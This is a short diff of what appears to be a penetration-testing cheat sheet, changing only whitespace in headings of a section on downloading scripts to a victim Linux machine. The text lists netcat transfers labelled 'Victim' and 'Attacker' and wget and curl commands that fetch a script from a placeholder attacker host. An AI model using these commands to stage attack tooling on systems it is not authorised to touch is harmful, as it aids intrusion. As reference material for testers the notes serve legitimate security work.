@@ -15,14 +15,14 @@
 
 ### Download Scripts:
 
-#### Linux 
+#### Linux
 
 #### Without Server:
 
 - Victim: `nc -nvlp <port> > <script>`
 - Attacker: `nc -nv <ip> <port> < <script>`
 
-#### With Server: 
+#### With Server:
 
 - `wget http://<ip>/<script>`
 - `curl http://<ip>/<script> -o <script>`
